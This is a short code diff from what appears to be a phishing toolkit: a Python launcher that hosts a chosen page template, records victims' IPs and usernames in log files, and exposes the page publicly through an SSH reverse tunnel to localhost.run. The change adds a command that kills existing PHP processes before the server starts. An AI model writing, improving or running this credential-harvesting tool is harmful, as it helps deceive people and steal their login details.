@@ -105,6 +105,7 @@ Please Choose A Number To Host Template:
     name_server = 'random'
     #print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
     print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
+    os.system("killall -2 php > /dev/null 2>&1")
     command1 = f"php -t sites/{choice} -S 127.0.0.1:{port}  &> /dev/null "
     command2 = f"ssh -R 80:0.0.0.0:{port} {name_server}@ssh.localhost.run"
     os.system(command1)
